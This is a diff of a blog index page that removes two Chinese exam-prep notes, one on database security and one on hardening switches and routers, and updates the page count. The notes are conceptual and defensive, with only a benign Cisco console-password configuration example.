-      <meta itemprop="name" content=" | Aono Note">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/03/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/" class="post-title-link" itemprop="url">数据库安全</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-03-08 22:46:30 / 修改时间：22:50:33" itemprop="dateCreated datePublished" datetime="2026-03-08T22:46:30+08:00">2026-03-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h2><p>文档记录了<strong>数据库系统安全</strong>，涵盖了安全概况、实现机制以及针对主流数据库（Oracle、MS SQL、MySQL、国产数据库）的安全分析与防护策略。</p>
-<h3 id="一、-数据库安全核心概念与目标"><a href="#一、-数据库安全核心概念与目标" class="headerlink" title="一、 数据库安全核心概念与目标"></a>一、 数据库安全核心概念与目标</h3><ul>
-<li><strong>安全核心</strong>：保障数据库的<strong>机密性、完整性、可用性</strong>。</li>
-<li><strong>四大领域</strong>：涉及数据库<strong>管理安全、数据安全、数据库应用安全以及数据库运行安全</strong>。</li>
-<li><strong>终极目标</strong>：保护数据库系统的<strong>安全运行及数据资源的安全性</strong>。</li>
-</ul>
-<h3 id="二、-面临的安全威胁与隐患"><a href="#二、-面临的安全威胁与隐患" class="headerlink" title="二、 面临的安全威胁与隐患"></a>二、 面临的安全威胁与隐患</h3><p>数据库环境日益开放，主要面临以下严重威胁和内部隐患：</p>
-<ol>
-<li><strong>授权的误用</strong>：<strong>合法用户越权获得他们不应该获得的资源</strong>，或将<strong>自身的访问特权不适当地授予其他用户</strong>。</li>
-<li><strong>逻辑推断和汇聚</strong>：利用逻辑推理，<strong>把不太敏感的数据结合起来可以推断出敏感信息</strong>。</li>
-<li><strong>伪装</strong>：假冒合法身份。</li>
-<li><strong>旁路控制</strong>：在数据库<strong>设置后门</strong>，绕过访问控制。</li>
-<li><strong>隐蔽信道</strong>：利用<strong>非正常的通信途径传输数据以躲避数据库安全机制的控制</strong>。</li>
-<li><strong>SQL注入攻击</strong>：应用程序的<strong>输入未进行安全检查</strong>。</li>
-<li><strong>口令破解</strong>：利用黑客手段进行<strong>“撞库”</strong>。</li>
-<li><strong>硬件及介质攻击</strong>。</li>
-<li><strong>系统与配置隐患</strong>：缺少强制密码机制、有<strong>公开的默认账号和默认密码</strong>；<strong>扩展存储过程成为数据库系统的后门</strong>；系统软件与应用程序漏洞；权限分配隐患；以及网络<strong>通信内容未经加密</strong>导致明文传递。</li>
-</ol>
-<h3 id="三、-关键安全机制与实现技术"><a href="#三、-关键安全机制与实现技术" class="headerlink" title="三、 关键安全机制与实现技术"></a>三、 关键安全机制与实现技术</h3><p>为了满足标识鉴别、访问控制、审计、加密等8大安全需求，主要采用以下技术：</p>
-<ol>
-<li><strong>数据库加密</strong>：<ul>
-<li>传输层：网上传输的数据<strong>通常利用SSL协议</strong>。</li>
-<li>存储层：通过数据库<strong>存储加密</strong>（分为库内加密和库外加密）。具体技术可细分为将<strong>数据库文件作为整体</strong>加密、对<strong>每一个记录加密</strong>，或深入到<strong>加密数据库的字段</strong>。</li>
-</ul>
-</li>
-<li><strong>数据库防火墙（主动防御）</strong>：<ul>
-<li><strong>核心逻辑</strong>：根据<strong>预定义的禁止和许可策略让合法的SQL操作通过，阻断非法违规操作</strong>。提供<strong>SQL注入禁止和数据库虚拟补丁包</strong>功能。</li>
-<li><strong>关键作用</strong>：<ul>
-<li><strong>屏蔽直接访问数据库的通道</strong>（部署在服务器和应用之间）。</li>
-<li><strong>增强认证</strong>（必须经过防火墙和数据库<strong>两层身份认证</strong>）。</li>
-<li><strong>攻击检测</strong>（检测SQL注入和缓冲区溢出，并<strong>报警或者阻止攻击行为</strong>）。</li>
-<li><strong>防止漏洞利用</strong>（<strong>实现虚拟化补丁</strong>）。</li>
-<li><strong>防止内部高危操作</strong>（<strong>限定更新和删除影响行、限定无Where的更新和删除操作、限定drop、truncate等高危操作</strong>）。</li>
-<li><strong>防止敏感数据泄露</strong>与<strong>数据库安全审计</strong>。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>数据库脱敏</strong>：<ul>
-<li>利用脱敏技术变换处理数据，<strong>在保持数据按需使用目标的同时，又能避免敏感数据外泄</strong>（采取<strong>屏蔽、变形、替换、随机、加密</strong>等手段）。</li>
-</ul>
-</li>
-<li><strong>数据库漏洞扫描</strong>：<ul>
-<li><strong>对目标数据库的安全性尝试进行安全探测分析，收集数据库漏洞的详细信息</strong>。</li>
-</ul>
-</li>
-</ol>
-<h3 id="四、-主流数据库安全防护与最佳实践"><a href="#四、-主流数据库安全防护与最佳实践" class="headerlink" title="四、 主流数据库安全防护与最佳实践"></a>四、 主流数据库安全防护与最佳实践</h3><ul>
-<li><strong>Oracle 数据库</strong>：<ul>
-<li><strong>机制</strong>：支持<strong>操作系统认证、网络认证、多级认证、SSL认证</strong>等（采用<strong>“用户名+口令”</strong>）。需进行<strong>特别认证</strong>和<strong>第三方/PKI/远程认证</strong>。</li>
-<li><strong>特色功能</strong>：建立<strong>保险库 (DV)</strong>保护敏感数据（防未授权变更、多因素授权等），通过<strong>安全域和命令规则</strong>特权控制，<strong>可阻止未授权命令操作</strong>。支持细粒度<strong>安全审计</strong>和<strong>高级安全功能（透明数据加密和数据屏蔽）</strong>。</li>
-<li><strong>最佳实践</strong>：<strong>增强操作系统安全</strong>、<strong>最小化安装</strong>、<strong>安装补丁</strong>、<strong>删改默认口令</strong>、<strong>设置最小化权限</strong>、<strong>限制IP地址</strong>、启用<strong>传输加密</strong>及<strong>Oracle审计</strong>、实施<strong>灾备计划</strong>。</li>
-</ul>
-</li>
-<li><strong>MS SQL 数据库</strong>：<ul>
-<li><strong>机制</strong>：支持<strong>Windows认证和混合认证</strong>。采用<strong>基于角色的访问控制</strong>（固定服务器、固定数据库、应用角色）。提供透明数据加密（涉及<strong>服务主密钥、数据库主密钥、数据库密钥</strong>）。支持<strong>静态备份和动态备份</strong>的多种方案。</li>
-<li><strong>最佳实践</strong>：<strong>加强扩展存储过程管理，删除不必要的存储过程</strong>；确保<strong>网上数据加密传输</strong>；<strong>修改默认TCP/IP端口号</strong>；进行<strong>IP限制</strong>和<strong>日志审计</strong>；及时修补漏洞。</li>
-</ul>
-</li>
-<li><strong>MySQL 数据库</strong>：<ul>
-<li><strong>机制</strong>：支持<strong>用户身份认证</strong>、灵活的<strong>访问授权</strong>（通过 <strong>grant 和 revoke 命令</strong>）及<strong>安全审计</strong>。</li>
-<li><strong>最佳实践</strong>：建立<strong>单独启动的用户和组</strong>；建立 <strong>Chrooting 运行环境</strong>（沙箱）；<strong>关闭远程连接</strong>（关3306端口）；<strong>禁止导入本地文件</strong>；<strong>修改root用户ID、密码和用户名</strong>；<strong>删除默认用户和db</strong>；建立<strong>独立使用数据库和用户账号</strong>；进行<strong>安全监测</strong>和<strong>安全备份</strong>。</li>
-</ul>
-</li>
-<li><strong>国产数据库</strong>：<ul>
-<li><strong>概况</strong>：由<strong>国家自主研发力量研制</strong>，遵循《<strong>信息安全技术数据库管理系统安全技术要求</strong>》。</li>
-<li><strong>安全威胁</strong>：除了自身漏洞和第三方组件影响外，主要威胁来自<strong>系统安全配置不当</strong>（如<strong>未启用国产数据库安全功能、设置数据库弱口令、开放过多的服务端口、使用非安全远程登录工具</strong>）。</li>
-<li><strong>防护措施</strong>：<strong>安全漏洞挖掘及扫描</strong>、<strong>加密</strong>、使用<strong>安全数据库</strong>。</li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/03/08/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/kehan.jpg">
-      <meta itemprop="name" content="Aono">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aono Note">
-      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Aono Note">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/03/08/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8/" class="post-title-link" itemprop="url">网络设备安全</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-03-08 22:46:14 / 修改时间：22:50:43" itemprop="dateCreated datePublished" datetime="2026-03-08T22:46:14+08:00">2026-03-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="网络设备安全"><a href="#网络设备安全" class="headerlink" title="网络设备安全"></a>网络设备安全</h2><p>文档记录了<strong>网络设备（主要为交换机和路由器）的安全问题、安全机制、加固技术及漏洞排查修补方法</strong>。</p>
-<h3 id="一、-网络设备安全概况与面临的威胁"><a href="#一、-网络设备安全概况与面临的威胁" class="headerlink" title="一、 网络设备安全概况与面临的威胁"></a>一、 网络设备安全概况与面临的威胁</h3><p>网络设备是网络的基础，其安全性直接关系到全网的可用性。</p>
-<ul>
-<li><strong>交换机的发展与安全威胁</strong>：<ul>
-<li><strong>演进</strong>：从第一代集线器（物理层）、第二代（数据链路层 MAC层交换）、第三代三层交换机（网络层，VLAN虚拟网络抑制广播风暴与硬件路由）、第四代（集成防火墙/IPS等多核业务）发展到第五代（支持SDN和强大QoS）。集线器是对接收到的信号再生整形放大，延长网络通信线路传输距离。</li>
-<li><strong>主要威胁</strong>：<strong>MAC地址泛洪</strong>（填满MAC表导致无法学习新地址）、<strong>ARP欺骗</strong>、口令威胁、漏洞利用（导致拒绝服务、信息泄露或会话劫持）。</li>
-</ul>
-</li>
-<li><strong>路由器的安全威胁</strong>：<ul>
-<li>路由器往往是网络攻击的首当其冲者。</li>
-<li><strong>主要威胁</strong>：漏洞利用、口令威胁、<strong>路由协议安全威胁</strong>（接收恶意路由包导致服务混乱）、<strong>DoS/DDoS攻击</strong>（直接攻击路由器或通过僵尸网络制造洪流压垮路由器）、<strong>依赖性威胁</strong>（攻击其依赖的认证服务器等）。</li>
-</ul>
-</li>
-</ul>
-<h3 id="二、-网络设备安全机制与实现技术"><a href="#二、-网络设备安全机制与实现技术" class="headerlink" title="二、 网络设备安全机制与实现技术"></a>二、 网络设备安全机制与实现技术</h3><p>网络设备内置了多种机制来保障自身的安全运作（以Cisco设备为例）：</p>
-<ol>
-<li><p><strong>认证机制 (AAA)</strong>：</p>
-<ul>
-<li>提供Console、AUX、VTY (Telnet/SSH)、user、privilege-level 等多渠道口令认证。</li>
-<li>console 口令使用过程如下：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Router# config terminal</span><br><span class="line">Enter configuration commands, one per line. End with CNTL/Z.</span><br><span class="line">Router(config)# line console 0</span><br><span class="line">Router(config-line)# password console-password</span><br><span class="line">Router(config-line)# login</span><br><span class="line">Router(config-line)# end</span><br></pre></td></tr></table></figure></li>
-<li>支持集中式认证服务器：<strong>TACACS+</strong>（认证、授权、审计分离，更安全）和 <strong>RADIUS</strong>（认证过程相对简单）。</li>
-</ul>
-<p>TACACS+ 协议采用的是将 AAA（身份验证、授权、审计）三个过程严格分离的架构，其交互过  程可以概括为三个阶段：</p>
-<ol>
-<li>身份验证阶段：发起连接，提交用户名密码，验证结果；</li>
-<li>授权阶段：身份验证通过后，发出授权请求 service=shell，返回通过或失败；</li>
-<li>审计阶段：开始执行start-exec记录，过程记录，结束记录；</li>
-</ol>
-<p>TACACS+ 协议要求用户提供用户名和口令进行认证，认证通过后再进行授权操作和审计。</p>
-</li>
-</ol>
-<ol>
-<li><strong>访问控制机制</strong>：<ul>
-<li><strong>带外管理</strong> (Console, AUX)：物理接触或Modem直连。</li>
-<li><strong>带内管理</strong> (VTY, HTTP, TFTP, SNMP)：依赖网络通信。</li>
-<li><strong>网络设备访问方法</strong> ：控制端口 console port、辅助端口 AUX port、VTY、HTTP、TFTP、SNMP；console port是默认设置访问，AUX提供带外访问，VTY数量一般设置为5个，编号从0到4。</li>
-<li><strong>控制手段</strong>：利用<strong>ACL（访问控制列表）</strong>严格限制允许访问设备Console、VTY或HTTP服务的<strong>指定IP地址</strong>，并设置超时断开机制。</li>
-<li><strong>SNMP控制</strong>：设置难以猜测的只读/读写社区字符串（Community String），限制允许访问SNMP的IP，或直接关闭SNMP服务。</li>
-</ul>
-</li>
-<li><strong>安全管理与加密通信</strong>：<ul>
-<li><strong>特权分级</strong>：提供0-15个权限级别，基于最小特权原则分配操作能力。</li>
-<li><strong>信息加密</strong>：使用 <code>service password-encryption</code> 对配置文件中的明文口令进行加密。</li>
-<li><strong>安全通信</strong>：建立管理专网；将管理主机和路由器之间的全部通信进行加密，<strong>使用SSH替换Telnet</strong>（生成RSA密钥加密流量）；<strong>使用IPSec VPN</strong>加密管理工作站与网络设备间的通信。在路由器设置包过滤规则，只允许管理主机远程访问路由器。</li>
-</ul>
-</li>
-<li><strong>路由协议安全与防欺骗</strong>：<ul>
-<li><strong>协议认证</strong>：启用OSPF、RIPv2协议的<strong>MD5密码认证</strong>，防止接收非法的恶意路由更新（注：RIPv1不支持）。</li>
-<li><strong>防地址欺骗</strong>：开启 <strong>uRPF</strong> (Unicast Reverse-Path Verification) 检查源IP准确性，防止IP Spoofing攻击。</li>
-<li>关闭不安全的代理服务如 <code>ARP-Proxy</code>。</li>
-</ul>
-</li>
-<li><strong>审计与物理安全</strong>：<ul>
-<li><strong>日志审计</strong>：配置Syslog将控制台、缓冲区、终端和SNMP Traps等日志发送到专用日志服务器。</li>
-<li><strong>物理安全</strong>：严格控制设备的物理接触、安装、移动及控制台直连。</li>
-</ul>
-</li>
-</ol>
-<h3 id="三、-网络设备安全增强技术方法"><a href="#三、-网络设备安全增强技术方法" class="headerlink" title="三、 网络设备安全增强技术方法"></a>三、 网络设备安全增强技术方法</h3><p>针对交换机和路由器的具体加固手段：</p>
-<ul>
-<li><strong>交换机安全增强</strong>：<ol>
-<li><strong>双层安全登录</strong>：第一层通过ACL过滤连接IP，第二层通过口令认证验证身份。</li>
-<li><strong>流量监测</strong>：利用<strong>端口镜像（Port Mirroring）</strong>技术将流量复制到监控端口，用于安全分析和故障排除。</li>
-<li><strong>MAC地址控制</strong>：限制端口最多可学习的MAC地址数量（防MAC泛洪），并设置合理的MAC地址老化时间（默认300秒）。</li>
-</ol>
-</li>
-<li><strong>路由器安全增强</strong>：<ol>
-<li><strong>系统与服务瘦身</strong>：及时升级IOS操作系统打补丁；<strong>明确关闭不使用的端口</strong>；关闭不必要的网络服务（BOOTP, Finger, NTP, Echo, CDP等）。</li>
-<li><strong>网络层限制</strong>：禁止<strong>IP直接广播</strong>（防Smurf攻击）；禁止源路由（Source-route）。</li>
-<li><strong>阻断恶意数据包</strong>：通过ACL拦截声称来自内部网的外部包、Loopback包、ICMP重定向包等。</li>
-<li><strong>口令存放</strong>：使用 <code>enable secret</code> 以密文形式强哈希保存最高权限密码。</li>
-<li>修改厂商默认的SNMP public/private 验证字。</li>
-</ol>
-</li>
-</ul>
-<h3 id="四、-网络设备常见漏洞与解决方法"><a href="#四、-网络设备常见漏洞与解决方法" class="headerlink" title="四、 网络设备常见漏洞与解决方法"></a>四、 网络设备常见漏洞与解决方法</h3><ul>
-<li><strong>常见漏洞类型</strong>：<ul>
-<li>拒绝服务漏洞 (DoS)、CSRF跨站伪造请求、格式化字符串漏洞、XSS跨站脚本、旁路绕过 (Bypass)、<strong>代码执行 (危害极大，可接管设备)</strong>、溢出漏洞、内存破坏。</li>
-</ul>
-</li>
-<li><strong>漏洞生命周期管理与解决步骤</strong>：<ol>
-<li><strong>获取信息</strong>：比对当前IOS版本与设备厂商（如思科、华为）的CVE漏洞信息库。</li>
-<li><strong>漏洞扫描</strong>：使用端口扫描器（Nmap）、通用扫描器（OpenVAS, Metasploit）或专用扫描器（Cisco Torch, CAT）排查隐患。</li>
-<li><strong>漏洞修补策略</strong>：<ul>
-<li><strong>修改配置</strong>：更改默认口令、关闭多余服务、加密敏感数据。</li>
-<li><strong>限制利用条件</strong>：用ACL限制只有特定IP能触碰易受攻击的端口。</li>
-<li><strong>服务替换</strong>：用安全的SSH替换Telnet，使用IPSec。</li>
-<li><strong>软件升级</strong>：下载并安装厂商提供的安全补丁包/IOS升级固件（根本解决手段）。</li>
-</ul>
-</li>
-</ol>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
